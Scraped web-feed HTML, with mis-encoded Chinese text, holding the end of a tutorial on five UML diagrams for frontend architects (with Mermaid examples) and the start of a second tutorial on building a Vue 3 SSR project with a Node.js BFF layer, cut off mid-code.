<p>åœ¨æ²¡æœ‰ UML çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç”»å›¾é€šå¸¸æ˜¯â€œéšæ„å‘æŒ¥â€ï¼šåœ†åœˆä»£è¡¨ç»„ä»¶ï¼Œæ–¹å—ä»£è¡¨æ•°æ®åº“ï¼Œç®­å¤´ä»£è¡¨è¯·æ±‚ã€‚ä½†æ–°æ¥çš„åŒäº‹çœ‹ä¸æ‡‚ï¼š<em>è¿™ä¸ªç®­å¤´æ˜¯æ•°æ®æµå‘ï¼Œè¿˜æ˜¯ä¾èµ–å…³ç³»ï¼Ÿ</em></p>
<p>UML è§£å†³äº†<strong>æ­§ä¹‰æ€§</strong>ã€‚å®ƒè§„å®šï¼š</p>
<ul>
<li>å®çº¿ç®­å¤´ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> æ˜¯å…³è”ã€‚</li>
<li>è™šçº¿ç®­å¤´ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‡¢</mo></mrow><annotation encoding="application/x-tex">\dashrightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.437em;"/><span class="mrel amsrm">â‡¢</span></span></span></span></span> æ˜¯ä¾èµ–ã€‚</li>
<li>ç©ºå¿ƒè±å½¢ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‹„</mo></mrow><annotation encoding="application/x-tex">\diamond</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"/><span class="mord">â‹„</span></span></span></span></span> æ˜¯èšåˆã€‚</li>
</ul>
<p>æŒæ¡ UMLï¼Œå°±æ˜¯æŒæ¡äº†<strong>æŠ€æœ¯è®¾è®¡çš„æ ‡å‡†è¡¨è¾¾èƒ½åŠ›</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-1">2. å‰ç«¯æ¶æ„å¸ˆå¿…é¡»æŒæ¡çš„ 5 ç§ UML å›¾</h3>
<p>æˆ‘ä»¬å°†å®ƒä»¬æ˜ å°„å› <strong>4+1 è§†å›¾</strong>ï¼Œè®©ä½ çš„çŸ¥è¯†ä½“ç³»é—­ç¯ã€‚</p>
<h4 data-id="heading-2">â‘  ç”¨ä¾‹å›¾ (Use Case Diagram)</h4>
<ul>
<li><strong>å¯¹åº”è§†å›¾</strong>ï¼šåœºæ™¯è§†å›¾ (Scenarios)</li>
<li><strong>å‰ç«¯è§†è§’</strong>ï¼š<strong>è°ï¼ˆActorï¼‰</strong> åœ¨è¿™ä¸ªé¡µé¢ä¸Šèƒ½ <strong>åšä»€ä¹ˆï¼ˆUse Caseï¼‰</strong> ï¼Ÿ</li>
<li><strong>ä½œç”¨</strong>ï¼šç•Œå®šç³»ç»Ÿè¾¹ç•Œã€‚æ¯”å¦‚ï¼Œâ€œæ™®é€šç”¨æˆ·â€åªèƒ½æµè§ˆï¼Œâ€œç®¡ç†å‘˜â€å¯ä»¥åˆ é™¤ã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    %% è¿™æ˜¯ä¸€ä¸ªç®€åŒ–çš„ç”¨ä¾‹å›¾é£æ ¼
    User((Cç«¯ç”¨æˆ·))
    Admin((ç®¡ç†å‘˜))
    
    subgraph System [ç”µå•†å‰å°ç³»ç»Ÿ]
        direction TB
        UC1(æµè§ˆå•†å“)
        UC2(åŠ å…¥è´­ç‰©è½¦)
        UC3(åå°ä¸‹æ¶å•†å“)
    end
    
    User --&gt; UC1
    User --&gt; UC2
    Admin --&gt; UC3
</code></pre>
<h4 data-id="heading-3">â‘¡ ç±»å›¾ (Class Diagram)</h4>
<ul>
<li><strong>å¯¹åº”è§†å›¾</strong>ï¼šé€»è¾‘è§†å›¾ (Logical)</li>
<li><strong>å‰ç«¯è§†è§’</strong>ï¼š<strong>æ•°æ®æ¨¡å‹ (Interfaces/Entities)</strong> å’Œ <strong>ç»„ä»¶å…³ç³»</strong>ã€‚</li>
<li><strong>ä½œç”¨</strong>ï¼šæè¿° TypeScript æ¥å£å®šä¹‰ã€React/Vue ç»„ä»¶çš„ Props ç»§æ‰¿å…³ç³»ã€‚è¿™æ˜¯é‡æ„æ—¶æœ€æœ‰ç”¨çš„å›¾ã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram
    %% å®šä¹‰æ¥å£
    class User {
        +String id
        +String name
        +login()
    }
    
    class Cart {
        +List~Item~ items
        +calcTotal()
    }
    
    class Product {
        +String sku
        +Number price
    }
    
    %% å…³ç³»æè¿°
    User "1" --&gt; "1" Cart : æ‹¥æœ‰ &gt;
    Cart "1" o-- "*" Product : åŒ…å« &gt;
</code></pre>
<h4 data-id="heading-4">â‘¢ æ—¶åºå›¾ (Sequence Diagram) â€”â€” <strong>æœ€é‡è¦çš„å›¾</strong></h4>
<ul>
<li><strong>å¯¹åº”è§†å›¾</strong>ï¼šå¤„ç†è§†å›¾ (Process)</li>
<li><strong>å‰ç«¯è§†è§’</strong>ï¼š<strong>ç»„ä»¶ã€BFFã€åç«¯æœåŠ¡ä¹‹é—´çš„äº¤äº’é¡ºåº</strong>ã€‚</li>
<li><strong>ä½œç”¨</strong>ï¼šç†æ¸…å¼‚æ­¥æµç¨‹ã€‚æ¯”å¦‚ OAuth2 ç™»å½•æµç¨‹ã€æ”¯ä»˜å›è°ƒæµç¨‹ã€‚å‰ç«¯æœ€å®¹æ˜“å‡º Bug çš„åœ°æ–¹éƒ½åœ¨æ—¶åºä¸Šã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as ç”¨æˆ·
    participant UI as å‰ç«¯é¡µé¢
    participant BFF as BFFå±‚(Node)
    participant Auth as è®¤è¯æœåŠ¡
    
    User-&gt;&gt;UI: ç‚¹å‡»ç™»å½•
    UI-&gt;&gt;BFF: POST /api/login
    BFF-&gt;&gt;Auth: éªŒè¯è´¦å·å¯†ç 
    Auth--&gt;&gt;BFF: è¿”å› Token
    BFF--&gt;&gt;UI: Set-Cookie: Token
    UI--&gt;&gt;User: è·³è½¬è‡³é¦–é¡µ
</code></pre>
<h4 data-id="heading-5">â‘£ çŠ¶æ€å›¾ (State Diagram)</h4>
<ul>
<li><strong>å¯¹åº”è§†å›¾</strong>ï¼šå¤„ç†è§†å›¾ (Process)</li>
<li><strong>å‰ç«¯è§†è§’</strong>ï¼š<strong>å¤æ‚ UI çš„çŠ¶æ€æµè½¬</strong>ã€‚</li>
<li><strong>ä½œç”¨</strong>ï¼šæè¿°ä¸€ä¸ªå¯¹è±¡ï¼ˆå¦‚â€œè®¢å•â€ã€â€œæ’­æ”¾å™¨â€ã€â€œè¡¨å•â€ï¼‰ç”Ÿå‘½å‘¨æœŸå†…çš„æ‰€æœ‰çŠ¶æ€ã€‚æ¯”å¦‚è®¢å•ä»â€œå¾…æ”¯ä»˜â€åˆ°â€œå·²å‘è´§â€çš„å„ç§å˜è¿æ¡ä»¶ã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; Idle: é¡µé¢åŠ è½½
    Idle --&gt; Loading: ç”¨æˆ·ç‚¹å‡»æœç´¢
    Loading --&gt; Success: æ¥å£è¿”å› 200
    Loading --&gt; Error: æ¥å£è¿”å› 500
    
    Success --&gt; Idle: é‡æ–°æœç´¢
    Error --&gt; Loading: ç‚¹å‡»é‡è¯•
</code></pre>
<h4 data-id="heading-6">â‘¤ éƒ¨ç½²å›¾ (Deployment Diagram)</h4>
<ul>
<li><strong>å¯¹åº”è§†å›¾</strong>ï¼šç‰©ç†è§†å›¾ (Physical)</li>
<li><strong>å‰ç«¯è§†è§’</strong>ï¼š<strong>ä»£ç æ„å»ºåå»å“ªäº†ï¼Ÿ</strong></li>
<li><strong>ä½œç”¨</strong>ï¼šå±•ç¤º CDNã€Nginxã€å®¹å™¨ã€å®¢æˆ·ç«¯ç¯å¢ƒçš„æ‹“æ‰‘ç»“æ„ã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    %% ================= æ ·å¼å®šä¹‰ =================
    classDef plain fill:#fff,stroke:#333,stroke-width:1px;
    classDef server fill:#e1f5fe,stroke:#0277bd,stroke-width:2px;

    subgraph Client ["ç”¨æˆ·ç»ˆç«¯ (Client)"]
        direction TB
        Browser["Chrome/Safari"]:::plain
        App["App WebView"]:::plain
    end
    
    subgraph Network ["ç½‘ç»œå±‚ (Network)"]
        direction TB
        CDN(("CDN åŠ é€Ÿ")):::plain
        LB["Nginx è´Ÿè½½å‡è¡¡"]:::plain
    end
    
    subgraph Server ["æœåŠ¡ç«¯å®¹å™¨ (Server)"]
        direction TB
        %% ä¿®å¤ç‚¹ï¼šè¿™é‡Œå¿…é¡»åŠ åŒå¼•å· "..." å¦åˆ™æŠ¥é”™
        Node["SSR æœåŠ¡ (Pod)"]:::server
        API["åç«¯ API (Pod)"]:::server
    end
    
    %% è¿æ¥å…³ç³»
    Browser --&gt; CDN
    App --&gt; CDN
    CDN --&gt; LB
    LB --&gt; Node
    Node --&gt; API
</code></pre>
<h3 data-id="heading-7">3. å·¥å…·æ¨è (Tooling)</h3>
<p>ä½œä¸ºæ¶æ„å¸ˆï¼Œå·¥å…·çš„é€‰æ‹©ä½“ç°äº†æ•ˆç‡ã€‚</p>
<ol>
<li>
<p><strong>Mermaid (å¼ºçƒˆæ¨è)</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šä»£ç å³å›¾è¡¨ (Diagram as Code)ã€‚</li>
<li><strong>åœºæ™¯</strong>ï¼šç›´æ¥å†™åœ¨ Markdown æ–‡æ¡£ã€Notion æˆ–æ˜é‡‘æ–‡ç« é‡Œã€‚åˆ©äºç‰ˆæœ¬æ§åˆ¶ï¼ˆGit Diff èƒ½çœ‹å‡ºå›¾æ”¹äº†å“ªé‡Œï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>PlantUML</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šåŠŸèƒ½æœ€å¼ºå¤§ï¼Œæ”¯æŒæœ€æ ‡å‡†çš„ UML è§„èŒƒã€‚</li>
<li><strong>åœºæ™¯</strong>ï¼šéå¸¸å¤æ‚çš„åç«¯æ¶æ„è®¾è®¡ã€‚</li>
</ul>
</li>
<li>
<p><strong>Draw.io / Excalidraw</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ‹–æ‹½å¼ï¼Œæ‰‹ç»˜é£ã€‚</li>
<li><strong>åœºæ™¯</strong>ï¼šå¤´è„‘é£æš´ï¼ŒPPT å±•ç¤ºï¼ˆExcalidraw çš„æ‰‹ç»˜é£éå¸¸é€‚åˆæŠ€æœ¯åˆ†äº«ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>éšæ„å‘æŒ¥</strong></p>
<ul>
<li>ç°åœ¨æœ‰å¾ˆå¤šAIå·¥ä½œæµçš„ç»˜å›¾ç½‘ç«™</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">4. è§‚ç‚¹å»ºè®®</h3>
<ol>
<li><strong>UML ä¸æ˜¯ä¸ºäº†ç”»ç»™åˆ«äººçœ‹ï¼Œè€Œæ˜¯ä¸ºäº†å¸®è‡ªå·±æƒ³æ¸…æ¥š</strong>ã€‚å¾ˆå¤šæ—¶å€™å›¾ç”»ä¸å‡ºæ¥ï¼Œè¯´æ˜é€»è¾‘æ²¡ç†é¡ºã€‚</li>
<li><strong>å‰ç«¯ä¸è¦è¿‡åº¦è®¾è®¡</strong>ã€‚ä¸éœ€è¦æŠŠæ¯ä¸€ä¸ªå‡½æ•°éƒ½ç”»è¿›ç±»å›¾é‡Œï¼Œåªç”»<strong>æ ¸å¿ƒé¢†åŸŸæ¨¡å‹</strong>å’Œ<strong>å…³é”®äº¤äº’é“¾è·¯</strong>ã€‚</li>
<li><strong>å›¾æ–‡ä¸ç¬¦æ˜¯ç¾éš¾</strong>ã€‚å¦‚æœä»£ç æ”¹äº†ï¼Œå›¾å¿…é¡»æ›´æ–°ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ¨è Mermaidï¼ˆä»£ç åŒ–ï¼‰çš„åŸå› ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ”¥ã€Œä»é›¶åˆ°ä¸€ã€æˆ‘ç”¨ Node BFF æ‰‹æ’¸ä¸€ä¸ª Vue3 SSR é¡¹ç›®ï¼ˆé™„æºç ï¼‰]]></title>    <link>https://juejin.cn/post/7592501225003991091</link>    <guid>https://juejin.cn/post/7592501225003991091</guid>    <pubDate>2026-01-07T15:18:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592501225003991091" data-draft-id="7592497088790462491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ”¥ã€Œä»é›¶åˆ°ä¸€ã€æˆ‘ç”¨ Node BFF æ‰‹æ’¸ä¸€ä¸ª Vue3 SSR é¡¹ç›®ï¼ˆé™„æºç ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2026-01-07T15:18:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="404æ˜Ÿçƒçš„çŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/193147068224126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ”¥ã€Œä»é›¶åˆ°ä¸€ã€æˆ‘ç”¨ Node BFF æ‰‹æ’¸ä¸€ä¸ª Vue3 SSR é¡¹ç›®ï¼ˆé™„æºç ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/193147068224126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    404æ˜Ÿçƒçš„çŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:18:48.000Z" title="Wed Jan 07 2026 15:18:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æˆ‘ç”¨ BFF å®ç°äº†ä¸€ä¸ª SSR</h2>
<blockquote>
<p>æœ¬æ–‡ä»‹ç»å¦‚ä½•ä½¿ç”¨ Node.js ä½œä¸ºä¸­é—´å±‚ï¼ˆBFFï¼‰ï¼Œç»“åˆ Vue 3 å’Œ Vite å®ç°æœåŠ¡ç«¯æ¸²æŸ“ï¼ˆSSRï¼‰ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/221b851b531f44a9b7cbb93403d45356~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNDA05pif55CD55qE54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768403927&amp;x-signature=Ts23OfvEE5iiAilgiGObB1PeJdA%3D" alt="é¡¹ç›®é¢„è§ˆ" loading="lazy"/></p>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆéœ€è¦ SSRï¼Ÿ</h3>
<p>åœ¨ä¼ ç»Ÿçš„å•é¡µåº”ç”¨ï¼ˆSPAï¼‰ä¸­ï¼Œæµè§ˆå™¨é¦–å…ˆåŠ è½½ä¸€ä¸ªç©ºç™½çš„ HTMLï¼Œç„¶åé€šè¿‡ JavaScript åŠ¨æ€æ¸²æŸ“é¡µé¢å†…å®¹ã€‚è¿™ç§æ–¹å¼å­˜åœ¨ä¸¤ä¸ªæ˜æ˜¾çš„é—®é¢˜ï¼š</p>

















<table><thead><tr><th>é—®é¢˜</th><th>å½±å“</th></tr></thead><tbody><tr><td><strong>é¦–å±åŠ è½½æ…¢</strong></td><td>ç”¨æˆ·éœ€è¦ç­‰å¾… JS ä¸‹è½½ã€è§£æã€æ‰§è¡Œåæ‰èƒ½çœ‹åˆ°å†…å®¹</td></tr><tr><td><strong>SEO ä¸å‹å¥½</strong></td><td>æœç´¢å¼•æ“çˆ¬è™«å¯èƒ½æ— æ³•æ­£ç¡®ç´¢å¼•åŠ¨æ€ç”Ÿæˆçš„å†…å®¹</td></tr></tbody></table>
<p><strong>SSRï¼ˆServer-Side Renderingï¼‰</strong> å¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™äº›é—®é¢˜â€”â€”åœ¨æœåŠ¡ç«¯å°±æŠŠé¡µé¢æ¸²æŸ“æˆå®Œæ•´çš„ HTMLï¼Œæµè§ˆå™¨æ‹¿åˆ°åç›´æ¥å±•ç¤ºã€‚</p>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯ BFFï¼Ÿ</h3>
<p><strong>BFFï¼ˆBackend For Frontendï¼‰</strong> æ˜¯ä¸€ç§æ¶æ„æ¨¡å¼ï¼ŒæŒ‡çš„æ˜¯ä¸“é—¨ä¸ºå‰ç«¯æœåŠ¡çš„åç«¯å±‚ã€‚åœ¨ SSR åœºæ™¯ä¸­ï¼ŒNode.js ä½œä¸º BFF æ‰¿æ‹…ä¸¤ä¸ªæ ¸å¿ƒèŒè´£ï¼š</p>
<pre><code class="hljs language-css" lang="css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â NodeÂ BFFÂ èŒè´£Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Â Â <span class="hljs-number">1</span>ï¸âƒ£Â Â SSRÂ æ¸²æŸ“ï¼šå°†Â VueÂ ç»„ä»¶æ¸²æŸ“ä¸ºÂ <span class="hljs-selector-tag">HTML</span>Â å­—ç¬¦ä¸²Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
â”‚Â Â <span class="hljs-number">2</span>ï¸âƒ£Â Â APIÂ ä»£ç†ï¼šæä¾›å‰ç«¯éœ€è¦çš„æ¥å£ï¼Œèšåˆåç«¯æœåŠ¡Â Â Â Â Â Â Â Â Â Â Â Â â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-3">é¡¹ç›®æ¶æ„</h3>
<p>æˆ‘å®ç°çš„è¿™ä¸ª SSR é¡¹ç›®æ•´ä½“æ¶æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">æµè§ˆå™¨è¯·æ±‚
Â Â Â Â â”‚
Â Â Â Â â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Â Â Â Â Â Â Â Â Â Â Â Node.jsÂ (Express)Â Â Â Â Â Â Â Â Â Â Â â”‚
â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â BFFÂ ä¸­é—´å±‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Â Â â€¢Â å¤„ç†Â /api/*Â è¯·æ±‚Â â†’Â è¿”å›Â JSONÂ Â Â Â Â Â Â â”‚
â”‚Â Â â€¢Â å¤„ç†é¡µé¢è¯·æ±‚Â â†’Â SSRÂ æ¸²æŸ“Â HTMLÂ Â Â Â Â Â Â â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Â Â Â Â â”‚
Â Â Â Â â–¼
æµè§ˆå™¨æ˜¾ç¤ºÂ â†’Â JSÂ åŠ è½½Â â†’Â HydrationÂ æ¿€æ´»
</code></pre>
<h3 data-id="heading-4">æ ¸å¿ƒå®ç°</h3>
<h4 data-id="heading-5">1. é¡¹ç›®å…¥å£åˆ†ç¦»</h4>
<p>SSR é¡¹ç›®éœ€è¦ä¸¤ä¸ªå…¥å£æ–‡ä»¶ï¼š</p>




















<table><thead><tr><th>æ–‡ä»¶</th><th>è¿è¡Œç¯å¢ƒ</th><th>èŒè´£</th></tr></thead><tbody><tr><td><code>entry-server.js</code></td><td>Node.js</td><td>æ¸²æŸ“ Vue ç»„ä»¶ä¸º HTML å­—ç¬¦ä¸²</td></tr><tr><td><code>entry-client.js</code></td><td>æµè§ˆå™¨</td><td>æ¿€æ´»é™æ€ HTMLï¼Œæ¢å¤äº¤äº’èƒ½åŠ›</td></tr></tbody></table>
<p><strong>æœåŠ¡ç«¯å…¥å£ <code>entry-server.js</code>ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>Â {Â renderToStringÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">"vue/server-renderer"</span>;
<span class="hljs-keyword">import</span>Â {Â createAppÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">"./main.js"</span>;

<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">async</span>Â <span class="hljs-keyword">function</span>Â <span class="hljs-title function_">render</span>(<span class="hljs-params">url</span>)Â {
Â Â <span class="hljs-keyword">const</span>Â {Â app,Â router,Â piniaÂ }Â =Â <span class="hljs-title function_">createApp</span>();

Â Â <span class="hljs-comment">//Â è®¾ç½®æœåŠ¡ç«¯è·¯ç”±</span>
Â Â router.<span class="hljs-title function_">push</span>(url);
Â Â <span class="hljs-keyword">await</span>Â router.<span class="hljs-title function_">isReady</span>();

Â Â <span class="hljs-comment">//Â æ¸²æŸ“ä¸ºÂ HTMLÂ å­—ç¬¦ä¸²</span>
Â Â <span class="hljs-keyword">const</span>Â htmlÂ =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">renderToString</span>(app);

Â Â <span class="hljs-comment">//Â è¿”å›Â HTMLÂ å’ŒçŠ¶æ€ï¼ˆç”¨äºå®¢æˆ·ç«¯è¿˜åŸï¼‰</span>
